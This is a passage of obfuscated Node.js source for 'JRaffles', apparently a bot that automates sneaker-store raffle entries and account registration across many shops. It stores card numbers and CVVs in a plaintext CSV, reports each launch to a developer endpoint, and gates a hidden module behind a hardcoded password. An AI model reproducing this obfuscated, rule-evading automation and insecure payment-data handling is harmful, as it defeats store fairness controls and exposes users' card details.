                            _0x2896df == 'yes' && _0x434e13 >= 0x5 && (_0x11ea8b(_0x3570d2[_0x59448c], _0xf2878b), _0x2896df = 'no', _0x434e13 = 0x0), console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x2e310b) {
                    var _0x29d8af = await _0x422d6b(), _0x1d669d = _0x25647b['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x382016 = _0x20cf77['parse'](_0x1d669d, { 'header': !![] })['data'];
                    for (var _0x4d2399 = 0x0; _0x4d2399 < _0x382016['length']; _0x4d2399++) {
                        var _0x254be4 = _0x382016[_0x4d2399]['Store'], _0x1fb5a2 = _0x382016[_0x4d2399]['Mode'];
                        for (var _0xd6399a of _0x388222) {
                            const _0x19f0e2 = _0xd6399a['name']['includes'](_0x254be4);
                            if (!_0x19f0e2)
                                continue;
                            for (mode of _0xd6399a['modules']) {
                                if (mode['name'] == _0x1fb5a2) {
                                    console['log']('Running\x20' + _0x49a6ed['cyan'](mode['name'])), await mode['function'](mode, [_0x382016[_0x4d2399]], _0x29d8af);
                                    var _0xe04c79 = _0x1d669d['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x25647b['writeFileSync']('../failed-tasks.csv', _0xe04c79);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x2c1f02 = await _0x2da047['get']('Answer');
                    if (_0x2c1f02['Answer']['toLowerCase']() == 'y') {
                        _0x25647b['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x63aa6a(0x3e8);
                        return;
                    }
                    if (_0x2c1f02['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x63aa6a(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x63aa6a(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x3d3f13(_0x6244ed) {
    var _0x5d2559 = await _0x422d6b(), _0x135c0a = _0x25647b['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x530d5e = _0x20cf77['parse'](_0x135c0a, { 'header': !![] })['data'];
    for (var _0x511564 = 0x0; _0x511564 < _0x530d5e['length']; _0x511564++) {
        var _0x3f90cb = _0x530d5e[_0x511564]['Store'], _0x23176f = _0x530d5e[_0x511564]['Mode'];
        for (var _0x345595 of _0x388222) {
            const _0x431cda = _0x345595['name']['includes'](_0x3f90cb);
            if (_0x431cda)
                for (mode of _0x388222[_0x345595]['modules']) {
                    const _0x24d7e2 = mode['name']['includes'](_0x23176f);
                    _0x24d7e2 && (_0x6244ed = mode['name'], await mode['function'](_0x6244ed, _0x530d5e[_0x511564], _0x5d2559));
                }
        }
    }
}
async function _0x581f12() {
    await _0x48544d(), console['clear']();
    _0x2ab3b9['threads'] > 0x5 && (_0x2ab3b9['threads'] = 0x5);
    if (_0xb0ce0a != 'devkey') {
        let _0x27e2ce = await _0x585d42['autoUpdate']();
        if (_0x27e2ce === 'yes')
            return _0x4d4fd9('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1fc4ae == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x63aa6a(0x2710);
        ;
    }
    await _0x3ffb54(_0x1fc4ae);
    if (_0x3bf944 === ![])
        return console['log']('Closing\x20Browser'), await _0x63aa6a(0xbb8);
    else
        try {
            var _0x48ca90 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x484f45
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0xb0ce0a
                    }
                ]
            }];
            const _0x4d55ad = { 'embeds': _0x48ca90 };
            var _0xd1c6c5 = await _0x198507(null, null, 'open', ![]);
            const _0x3d7567 = { 'openDEVMSG': { 'embeds': [_0xd1c6c5] } };
            await _0x56185b(_0x32ae6a, _0x3d7567['openDEVMSG']);
            async function _0xb5aa02() {
                _0x9474bc('JRaffles\x20' + _0xb0ce0a), console['clear'](), console['log']('Hello\x20' + _0x49a6ed['cyan']('' + _0x484f45) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0xb0ce0a), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x444a82 = 0x0; _0x444a82 < _0x388222['length'] - 0x4; _0x444a82++) {
                    if (_0x444a82 >= 0xa) {
                        console['log']('\x20(' + _0x444a82 + ')\x20[' + _0x388222[_0x444a82]['name'] + ']');
                        continue;
                    }
                    if (_0x388222[_0x444a82]['name'] === 'Reload\x20Settings' || _0x388222[_0x444a82]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x444a82 + ')\x20\x20[' + _0x388222[_0x444a82]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x388222['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x388222['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x388222['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x388222['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x3734ab();
                if (taskModule > _0x388222['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x63aa6a(0x3e8), _0xb5aa02();
                if (_0x388222[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                    var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0xd1c022 = await _0x422d6b();
                            await _0x5c698f['function'](_0x5c698f, _0xd1c022);
                        }
                        if (taskFunction == 0x2) {
                            var _0xd1c022 = await _0x422d6b(), _0x898764 = await _0x153974(_0x5c698f);
                            _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x898764), await _0x5c698f['function'](_0x5c698f, _0x898764, _0xd1c022);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0xd1c022 = await _0x422d6b(), _0x898764 = await _0x153974(_0x5c698f);
                                _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x898764), await _0x5c698f['function'](_0x5c698f, _0x898764, _0xd1c022);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0xd1c022 = await _0x422d6b();
                                    await _0x5c698f['function'](_0x5c698f, _0xd1c022);
                                }
                            }
                        }
                    } catch (_0x4258ad) {
                        console['log'](_0x4258ad), await _0x63aa6a(0x7d0);
                    }
                    return _0xb5aa02();
                }
                if (_0x388222[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                        var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0xd1c022 = await _0x422d6b(), _0x2e2ec7 = await _0x153974(_0x5c698f);
                            _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x2e2ec7), await _0x5c698f['function'](_0x5c698f, _0x2e2ec7, _0xd1c022);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0xd1c022 = await _0x422d6b(), _0x2e2ec7 = await _0x153974(_0x5c698f);
                                _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x2e2ec7), await _0x5c698f['function'](_0x5c698f, _0x2e2ec7, _0xd1c022);
                            }
                        }
                    } catch (_0x3de762) {
                        console['log'](_0x3de762), await _0x63aa6a(0xfa0);
                    }
                    return _0xb5aa02();
                }
                if (_0x388222[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                        var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0xd1c022 = await _0x422d6b(), _0x2e2ec7 = await _0x153974(_0x5c698f);
                            _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x2e2ec7), await _0x5c698f['function'](_0x5c698f, _0x2e2ec7, _0xd1c022);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0xd1c022 = await _0x422d6b(), _0x2e2ec7 = await _0x153974(_0x5c698f);
                                _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x2e2ec7), await _0x5c698f['function'](_0x5c698f, _0x2e2ec7, _0xd1c022);
                            }
                        }
                    } catch (_0x245fab) {
                        console['log'](_0x245fab), await _0x63aa6a(0xfa0);
                    }
                    return _0xb5aa02();
                }
                if (_0x388222[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                    var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0xd1c022 = await _0x422d6b();
                        return await _0x5c698f['function'](_0x5c698f, _0xd1c022), _0xb5aa02();
                    }
                    var _0xd1c022 = await _0x422d6b(), _0x1ea9ff = await _0x153974(_0x5c698f);
                    return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x1ea9ff), await _0x5c698f['function'](_0x5c698f, _0x1ea9ff, _0xd1c022), _0xb5aa02();
                }
                if (_0x388222[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                    var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0xd1c022 = await _0x422d6b(), _0x1ea9ff = await _0x153974(_0x5c698f);
                    return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x1ea9ff), await _0x5c698f['function'](_0x5c698f, _0x1ea9ff, _0xd1c022), _0xb5aa02();
                }
                if (_0x388222[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                    var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0xd1c022 = await _0x422d6b(), _0x1ea9ff = await _0x153974(_0x5c698f);
                    return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x1ea9ff), await _0x5c698f['function'](_0x5c698f, _0x1ea9ff, _0xd1c022), _0xb5aa02();
                }
                if (_0x388222[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                    var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0xd1c022 = await _0x422d6b(), _0x1ea9ff = await _0x153974(_0x5c698f);
                    return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x1ea9ff), await _0x5c698f['function'](_0x5c698f, _0x1ea9ff, _0xd1c022), _0xb5aa02();
                } else {
                    if (_0x388222[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                        var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0xd1c022 = await _0x422d6b(), _0x41f19b = await _0x153974(_0x5c698f);
                            return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x41f19b), await _0x5c698f['function'](_0x5c698f, _0x41f19b, _0xd1c022), _0xb5aa02();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0xd1c022 = await _0x422d6b();
                                return await _0x5c698f['function'](_0x5c698f, null, _0xd1c022), _0xb5aa02();
                            }
                        }
                        ;
                    } else {
                        if (_0x388222[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                            var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction], _0xd1c022 = await _0x422d6b(), _0x1b24fd = await _0x153974(_0x5c698f);
                            return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x1b24fd), await _0x5c698f['function'](_0x5c698f, _0x1b24fd, _0xd1c022), await _0x63aa6a(0x1388), _0xb5aa02();
                        } else {
                            if (_0x388222[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x3dc3f9 = { 'headers': { 'content-type': 'application/json' } }, _0x14199e = { 'key': _0x1fc4ae }, _0x286d2e = await _0x20b5bc['post']('https://jraffles.herokuapp.com/beta', _0x14199e, _0x3dc3f9);
                                    if (_0x286d2e['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x49a6ed['cyan'](_0x484f45) + '.\x20Beta\x20Access\x20Granted.'), await _0x63aa6a(0x3e8);
                                } catch (_0x3d6e0e) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x63aa6a(0x7d0), _0xb5aa02();
                                }
                                taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                                var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction], _0xd1c022 = await _0x422d6b(), _0x1b24fd = await _0x153974(_0x5c698f);
                                return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x1b24fd), await _0x5c698f['function'](_0x5c698f, _0x1b24fd, _0xd1c022), await _0x63aa6a(0x1388), _0xb5aa02();
                            } else {
                                if (_0x388222[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                                    var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0xd1c022 = await _0x422d6b(), _0x41f19b = await _0x153974(_0x5c698f);
                                        return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x41f19b), await _0x5c698f['function'](_0x5c698f, _0x41f19b, _0xd1c022), _0xb5aa02();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0xd1c022 = await _0x422d6b();
                                            return await _0x5c698f['function'](_0x5c698f, null, _0xd1c022), _0xb5aa02();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x388222[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                                        var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x5c698f);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x388222[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                                            var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0xd1c022 = await _0x422d6b(), _0x201a15 = await _0x153974(_0x5c698f);
                                                return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x201a15), await _0x5c698f['function'](_0x5c698f, _0x201a15, _0xd1c022), _0xb5aa02();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0xd1c022 = await _0x422d6b(), _0x201a15 = await _0x153974(_0x5c698f);
                                                    return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x201a15), await _0x5c698f['function'](_0x5c698f, _0x201a15, _0xd1c022), _0xb5aa02();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x388222[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                                                var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0xd1c022 = await _0x422d6b(), _0x529a59 = await _0x153974(_0x5c698f);
                                                    return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x529a59), await _0x5c698f['function'](_0x5c698f, _0x529a59, _0xd1c022), _0xb5aa02();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0xd1c022 = await _0x422d6b(), _0x529a59 = await _0x153974(_0x5c698f);
                                                        return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x529a59), await _0x5c698f['function'](_0x5c698f, _0x529a59, _0xd1c022), _0xb5aa02();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x388222[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                                                    var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0xd1c022 = await _0x422d6b(), _0x2d96b2 = await _0x153974(_0x5c698f);
                                                        return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x2d96b2), await _0x5c698f['function'](_0x5c698f, _0x2d96b2, _0xd1c022), _0xb5aa02();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0xd1c022 = await _0x422d6b(), _0x2d96b2 = await _0x153974(_0x5c698f);
                                                            return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x2d96b2), await _0x5c698f['function'](_0x5c698f, _0x2d96b2, _0xd1c022), _0xb5aa02();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x388222[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                                                        var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0xd1c022 = await _0x422d6b(), _0x40019d = await _0x153974(_0x5c698f);
                                                            return _0x2ab3b9['shuffleTasks'] && await _0x243072(_0x40019d), await _0x5c698f['function'](_0x5c698f, _0x40019d, _0xd1c022), _0xb5aa02();
                                                        }
                                                    } else {
                                                        if (_0x388222[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0x63aa6a(0x3e8), _0xb5aa02();
                                                        else {
                                                            if (_0x388222[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x57c80d = _0x388222[taskModule]['name'], _0xd1c022 = await _0x422d6b();
                                                                return await _0x2121ae(_0x57c80d, _0xd1c022), _0xb5aa02();
                                                            } else {
                                                                if (_0x388222[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x56d7ba(_0x388222[taskModule]['modules']);
                                                                    var _0x5c698f = _0x388222[taskModule]['modules'][taskFunction];
                                                                    return await _0x5c698f['function'](_0x5c698f), _0xb5aa02();
                                                                } else {
                                                                    if (_0x388222[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x9e6b07 = 0x0;
                                                                        for (const _0x2dcc4f in _0x2ab3b9) {
                                                                            console['log']('(' + _0x9e6b07 + ')\x20' + _0x2dcc4f + '\x20:\x20' + _0x2ab3b9[_0x2dcc4f]), _0x9e6b07++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x9e6b07 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0x6f3b41 = await _0x1fd500();
                                                                        if (_0x6f3b41 == _0x9e6b07)
                                                                            return _0xb5aa02();
                                                                        console['clear'];
                                                                        var _0x59b647 = 0x0;
                                                                        for (var _0x3b15a2 in _0x2ab3b9) {
                                                                            if (_0x6f3b41 == _0x59b647) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3b15a2 + '\x20:'), _0x2ab3b9[_0x3b15a2] = await _0x39324a(), _0x25647b['writeFileSync']('../settings.json', JSON['stringify'](_0x2ab3b9));
                                                                                break;
                                                                            } else
                                                                                _0x59b647++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0x63aa6a(0xbb8), _0xb5aa02();
                                                                    } else {
                                                                        if (_0x388222[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0x48544d(), _0xb5aa02();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0x388222[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x425c4f = await _0x3570e5();
                                                                                _0x425c4f == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x7f1ca8(), await afewFunction(_0x2c4b55[_0x39d55d], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x63aa6a(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0xb5aa02();
            } catch (_0x463cbb) {
                return console['log'](_0x463cbb), await _0x63aa6a(0x2710), _0xb5aa02();
            }
        } catch (_0x4d1301) {
            return console['log'](_0x4d1301), await _0x63aa6a(0x3a98);
        }
}
;
_0x9474bc('JRaffles\x20' + _0xb0ce0a);
try {
    _0x48544d(), _0x581f12();
} catch (_0x4eb5c5) {
    console['log'](_0x4eb5c5);
}